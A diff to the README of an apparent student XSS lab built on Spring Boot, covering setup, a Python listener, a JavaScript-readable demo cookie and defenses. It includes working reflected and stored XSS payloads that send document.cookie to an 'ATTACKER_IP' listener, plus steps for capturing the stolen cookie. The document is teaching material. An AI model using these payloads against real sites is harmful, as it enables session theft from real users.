@@ -1,229 +1,132 @@
-# vuln-xss-app — Vulnerable XSS Demo (Java / Spring Boot)
+# vuln-xss-app — Quick README (summary)
 
-**Project:** `vuln-xss-app`
-**Purpose:** Local, controlled demonstration of reflected, stored, and DOM XSS for educational use only.
+**Purpose:** Local, controlled vulnerability demo for Cross-Site Scripting (XSS). Use in isolated VMs only for education and assignments.
 
-> **Warning:** Do **not** use these payloads or servers against other machines or on the Internet. Run all demos only on localhost or in an isolated VM.
-
----
-
-## Contents
-
-- `pom.xml` — Maven project file
-- `src/main/java/com/example/vulnxss/` — Spring Boot sources
-- `src/main/resources/static/` — static frontend (search.html, comments.html, etc.)
-- `attacker_listener.py` — optional local listener for safe exfiltration demo (lab-only)
+> ⚠️ Safety: Run this only in machines and networks you control. Use fake/demo data only (e.g. `session=FAKE_FOR_DEMO`). Do not target external systems.
 
 ---
 
-## Quickstart (high-level)
+## What’s included
 
-- **Windows (PowerShell, admin):** install JDK 17 & Maven → `mvn spring-boot:run` → open `http://localhost:8080`
-- **Ubuntu (bash):** `sudo apt install openjdk-17-jdk maven` → `mvn spring-boot:run` → open `http://localhost:8080`
-- Optionally run `attacker_listener.py` (Python) to capture safe local exfil demonstration.
+- `pom.xml` — Maven project
+- `src/main/java/...` — Spring Boot server
+- `src/main/resources/static/` — front-end HTML (search.html, comments.html, etc.)
+- `attacker_listener.py` — simple Python listener (lab-only)
+- `DemoCookieController.java` — demo endpoint to set a JS-readable cookie (optional)
 
 ---
 
-## 1. Prerequisites
+## Quick setup (Ubuntu VM)
 
-### Windows (PowerShell)
-
-- Administrator access recommended for installs.
-- Install Chocolatey (if not installed): https://chocolatey.org/install
-- Install Java 17 and Maven via Chocolatey (PowerShell as Admin):
-
-```powershell
-choco install openjdk17 -y
-choco install maven -y
-```
-
-- Close & reopen PowerShell. Verify:
-
-```powershell
-java -version
-mvn -v
-```
-
-### Ubuntu (bash)
+1. Install prerequisites:
 
 ```bash
 sudo apt update
 sudo apt install -y openjdk-17-jdk maven python3 python3-pip
-java -version
-mvn -v
 ```
 
----
+2. Build the project (from project root):
 
-## 2. Prepare the project
+```bash
+mvn clean install -U
+```
 
-Open a terminal in the project root (where `pom.xml` lives). If you copied/cloned the repository, point your shell to that directory.
+3. Run the app (example port 3001):
 
----
-
-## 3. Run the Spring Boot app (Maven)
-
-**Default port:** 8080 (if busy, see alternate port below)
-
-### Windows (PowerShell)
-
-```powershell
-cd D:\262\A3\vuln-xss-app
-mvn spring-boot:run
-# OR run on a different port:
+```bash
 mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
 ```
 
-### Ubuntu (bash)
+---
 
-```bash
-cd ~/vuln-xss-app
-mvn spring-boot:run
-# OR different port:
-mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
+## Demo cookie (server-side) — `/set-demo-cookie`
+
+Visit `/set-demo-cookie` to set a **demo** cookie that JavaScript can read:
+
+```text
+GET /set-demo-cookie
+# sets: session=FAKE_FOR_DEMO (HttpOnly=false) — demo-only
 ```
 
-**Open in browser:** `http://localhost:8080` (or `:3001` if you changed it)
+**Note:** In production session cookies must be `HttpOnly`.
 
 ---
 
-## 4. Single-file Java server (no Maven alternative)
+## Attacker listener (on attacker VM)
 
-A lightweight single-file Java server is included (`VulnXssServer.java`) if you prefer not to use Maven.
-
-### Compile & run (Windows / Ubuntu)
-
-```bash
-javac VulnXssServer.java
-java VulnXssServer
-# server listens on http://localhost:3000
-```
-
----
-
-## 5. Optional: Local Python listener (safe exfil demo)
-
-This listener runs on your machine / VM and logs any HTTP POSTs that arrive. Use it only in your lab environment.
-
-Create `attacker_listener.py` with the following content:
-
-```python
-# attacker_listener.py (lab-only)
-from http.server import BaseHTTPRequestHandler, HTTPServer
-
-class Handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        length = int(self.headers.get('content-length', 0))
-        body = self.rfile.read(length).decode('utf-8', errors='replace')
-        print("=== Request received ===")
-        print("Path:", self.path)
-        print("Headers:", self.headers)
-        print("Body:", body)
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'OK')
-
-if __name__ == "__main__":
-    server = HTTPServer(('0.0.0.0', 9000), Handler)
-    print("Listening on http://0.0.0.0:9000")
-    server.serve_forever()
-```
-
-### Run listener
-
-**Windows:**
-
-```powershell
-python attacker_listener.py
-```
-
-**Ubuntu:**
+Save and run `attacker_listener.py` on the attacker VM to capture exfil requests:
 
 ```bash
 python3 attacker_listener.py
+# listens on 0.0.0.0:9000
 ```
 
-**Test payload (from vulnerable page)** — posts to your listener (local only):
+The listener logs GET/POST requests and prints query params and headers.
+
+---
+
+## Example attack payloads
+
+Replace `ATTACKER_IP` with your attacker VM IP (e.g. `10.0.2.6`) and `APP_PORT` with your app port (e.g. `3001`).
+
+**Reflected (URL) — exfiltrate cookie via img onerror**
+
+```
+http://localhost:APP_PORT/search.html?q=<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)">
+```
+
+(URL-encode if pasting into address bar.)
+
+**Stored (comment)** — post this as a comment body and reload the comments page:
 
 ```html
 <img
   src="x"
-  onerror="fetch('http://localhost:9000/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:'demo-data-from-xss'})"
+  onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)"
 />
 ```
 
-When you trigger such a payload in the vulnerable app (search q or comment), the listener terminal prints the received request.
-
----
-
-## 6. Quick test payloads (use in query `q=` or comments form)
-
-- Simple alert (may be blocked by modern browsers/extensions):
-
-```
-<script>alert('reflected')</script>
-```
-
-- More robust onerror payload (expected 404 but then runs):
+**Reliable visual payloads (for demos):**
 
 ```html
 <img
   src="x"
   onerror="console.log('XSS fired'); document.body.style.border='6px solid red'"
 />
-```
-
-- Visual defacement (safe):
-
-```html
-<script>
-  document.body.innerHTML = '<h1 style="color:red">Hacked — demo</h1>';
-</script>
-```
-
-- Local exfil (lab-only: posts to your listener):
-
-```html
-<img
-  src="x"
-  onerror="fetch('http://localhost:9000/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:'demo-cookie=FAKE'})"
-/>
+<svg/onload=console.log('svg onload fired')>
 ```
 
 ---
 
-## 7. Troubleshooting
+## Testing & verification
 
-### Port already in use
-
-If Spring Boot fails because the port is used:
-
-- Find process (PowerShell): `netstat -ano | Select-String ":8080\s"`
-- Kill process by PID (if safe): `Stop-Process -Id <PID> -Force`
-- Or run on a different port:
-
-```powershell
-mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
-```
-
-### `mvn` or `java` not found
-
-- Windows: ensure Chocolatey installed JDK and Maven and restart terminal. Verify `java -version` and `mvn -v`.
-- Ubuntu: `sudo apt install openjdk-17-jdk maven`.
-
-### Browser blocking alerts
-
-- Use `console.log` + a visible DOM change (banner or border) for reliable evidence.
-- Try Incognito to avoid extension interference.
+1. Start attacker listener on attacker VM: `python3 attacker_listener.py`.
+2. On client (victim) browser, visit `/set-demo-cookie` to set `session=FAKE_FOR_DEMO`.
+3. Trigger reflected or stored payload. Watch attacker listener log showing `c: ['session=FAKE_FOR_DEMO']`.
+4. Capture screenshots: listener output, browser console showing `document.cookie`, Elements showing injected node, and the URL or posted comment with the payload.
 
 ---
 
-## 8. Reverting demo-only changes
+## Common troubleshooting
 
-If you temporarily added demo-only code that executes payloads (e.g., creating `<script>` tags from user input), **remove it before submission**. Example revert for `search.html`:
+- If `curl -I` returns "Unsupported method ('HEAD')", use the updated `attacker_listener.py` that implements `do_HEAD` (included).
+- If listener gets no requests: check VM networking (host-only/internal/bridged), firewall (`ufw`), and that listener binds to `0.0.0.0`.
+- If `<script>` payloads don’t execute: modern browsers often do not execute `<script>` tags inserted via `innerHTML`. Use `img onerror` or append a `script` element via Console or a demo patch.
 
-```html
-const params = new URLSearchParams(location.search); const q = params.get('q')
-|| ''; document.getElementById('resultContainer').textContent = q; // safe
-display
-```
+---
+
+## Defenses (apply after demo)
+
+1. **Sanitize input** server-side (e.g. `Jsoup.clean(input, Safelist.none())`) before storing or reflecting.
+2. **Escape output** on frontend: use `element.textContent = userInput` instead of `innerHTML`.
+3. **Set HttpOnly** on session cookies so `document.cookie` cannot read them.
+4. **Content-Security-Policy** header to block inline JS (as second line of defense).
+5. Add security headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.
+
+---
+
+## Reverting demo changes (must do)
+
+- Remove `DemoCookieController` or set cookie to `HttpOnly=true`.
+- Revert any demo-only front-end code that auto-executes script content from query params or stored comments.
+- Replace any `innerHTML` use for untrusted data with `textContent` or sanitized HTML.
